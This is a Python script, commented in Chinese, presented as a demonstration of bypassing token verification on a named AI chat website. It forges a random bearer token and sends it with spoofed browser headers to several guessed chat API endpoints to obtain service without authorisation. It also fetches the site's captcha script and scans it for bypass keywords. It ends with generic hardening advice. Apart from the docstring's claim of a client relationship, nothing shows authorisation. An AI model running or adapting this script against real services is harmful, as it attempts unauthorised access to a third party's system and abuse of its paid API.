#!/usr/bin/env python3
"""
iwoozie.baby AI聊天系统 - Token生成和验证绕过演示脚本
作为乙方合作伙伴，用于向甲方展示系统安全漏洞
"""

import requests
import json
import time
import random
import string
from datetime import datetime, timedelta

class TokenBypassDemo:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        })
        
    def generate_fake_token(self):
        """生成伪造的token"""
        # 模拟前端token生成逻辑
        timestamp = int(time.time() * 1000)
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        
        # 构造类似真实token的格式
        fake_token = f"fake_token_{timestamp}_{random_part}"
        print(f"🔑 生成伪造Token: {fake_token}")
        return fake_token
    
    def test_token_validation(self, token):
        """测试token验证机制"""
        print(f"\n🔍 测试Token验证机制...")
        
        # 测试不同的API端点
        test_endpoints = [
            "/api/quick/createAITask",
            "/api/bc/chat",
            "/api/chat/completions",
            "/api/v1/chat"
        ]
        
        for endpoint in test_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                headers = {
                    'Authorization': f'Bearer {token}',
                    'x-api-key': token,
                    'x-token': token,
                    'x-auth-token': token
                }
                
                # 测试GET请求
                response = self.session.get(url, headers=headers, timeout=10)
                print(f"  GET  {endpoint}: {response.status_code}")
                
                # 测试POST请求
                test_data = {
                    "model": "GPT-4",
                    "messages": [{"role": "user", "content": "Hello"}]
                }
                response = self.session.post(url, json=test_data, headers=headers, timeout=10)
                print(f"  POST {endpoint}: {response.status_code}")
                
                if response.status_code == 200:
                    print(f"    ✅ 成功绕过验证！")
                    return True
                    
            except Exception as e:
                print(f"  ❌ {endpoint}: 错误 - {str(e)}")
        
        return False
    
    def attempt_chat_bypass(self, token):
        """尝试绕过聊天验证"""
        print(f"\n💬 尝试绕过聊天验证...")
        
        # 模拟聊天请求
        chat_data = {
            "model": "GPT-4",
            "messages": [
                {"role": "user", "content": "Hello, can you help me with a security test?"}
            ],
            "stream": False
        }
        
        headers = {
            'Authorization': f'Bearer {token}',
            'x-api-key': token,
            'Content-Type': 'application/json'
        }
        
        try:
            # 尝试多个可能的聊天端点
            chat_endpoints = [
                "/api/quick/createAITask",
                "/api/bc/chat",
                "/api/chat/completions",
                "/api/v1/chat/completions"
            ]
            
            for endpoint in chat_endpoints:
                url = f"{self.base_url}{endpoint}"
                response = self.session.post(url, json=chat_data, headers=headers, timeout=15)
                
                print(f"  {endpoint}: {response.status_code}")
                
                if response.status_code == 200:
                    result = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
                    print(f"    ✅ 成功获取聊天响应！")
                    print(f"    响应: {str(result)[:200]}...")
                    return True
                elif response.status_code == 403:
                    print(f"    ⚠️  需要验证码验证")
                else:
                    print(f"    ❌ 请求失败")
                    
        except Exception as e:
            print(f"  ❌ 聊天绕过失败: {str(e)}")
        
        return False
    
    def analyze_captcha_bypass(self):
        """分析验证码绕过可能性"""
        print(f"\n🛡️ 分析验证码绕过可能性...")
        
        # 获取验证码脚本
        try:
            captcha_url = f"{self.base_url}/api/bc/static/RG_Captcha.js"
            response = self.session.get(captcha_url, timeout=10)
            
            if response.status_code == 200:
                print(f"  ✅ 成功获取验证码脚本")
                print(f"  脚本大小: {len(response.text)} 字符")
                
                # 分析脚本内容
                script_content = response.text
                
                # 查找可能的token生成逻辑
                if 'token' in script_content.lower():
                    print(f"  �� 发现token相关代码")
                
                if 'captcha' in script_content.lower():
                    print(f"  🔍 发现验证码相关代码")
                
                # 查找可能的绕过点
                bypass_indicators = [
                    'bypass', 'skip', 'disable', 'override', 'fake',
                    'mock', 'test', 'debug', 'admin'
                ]
                
                found_indicators = []
                for indicator in bypass_indicators:
                    if indicator in script_content.lower():
                        found_indicators.append(indicator)
                
                if found_indicators:
                    print(f"  ⚠️  发现可能的绕过关键词: {', '.join(found_indicators)}")
                
                return True
            else:
                print(f"  ❌ 无法获取验证码脚本: {response.status_code}")
                
        except Exception as e:
            print(f"  ❌ 验证码分析失败: {str(e)}")
        
        return False
    
    def run_demo(self):
        """运行完整演示"""
        print("=" * 60)
        print("🔓 iwoozie.baby AI聊天系统 - Token绕过演示")
        print("=" * 60)
        print(f"目标系统: {self.base_url}")
        print(f"演示时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()
        
        # 步骤1: 生成伪造token
        print("步骤1: 生成伪造Token")
        fake_token = self.generate_fake_token()
        
        # 步骤2: 分析验证码绕过
        print("\n步骤2: 分析验证码绕过可能性")
        self.analyze_captcha_bypass()
        
        # 步骤3: 测试token验证
        print("\n步骤3: 测试Token验证机制")
        validation_success = self.test_token_validation(fake_token)
        
        # 步骤4: 尝试聊天绕过
        print("\n步骤4: 尝试绕过聊天验证")
        chat_success = self.attempt_chat_bypass(fake_token)
        
        # 总结
        print("\n" + "=" * 60)
        print("📊 演示结果总结")
        print("=" * 60)
        
        if validation_success or chat_success:
            print("🚨 发现安全漏洞:")
            print("  ✅ 可以生成伪造Token")
            print("  ✅ 可以绕过部分验证机制")
            print("  ⚠️  系统存在安全风险")
        else:
            print("✅ 系统安全状况:")
            print("  ✅ Token验证机制有效")
            print("  ✅ 无法直接绕过验证")
            print("  ✅ 系统相对安全")
        
        print("\n💡 建议改进措施:")
        print("  1. 加强服务端Token验证")
        print("  2. 实现更严格的验证码机制")
        print("  3. 添加请求频率限制")
        print("  4. 实施IP白名单机制")
        print("  5. 定期进行安全审计")

if __name__ == "__main__":
    demo = TokenBypassDemo()
    demo.run_demo()
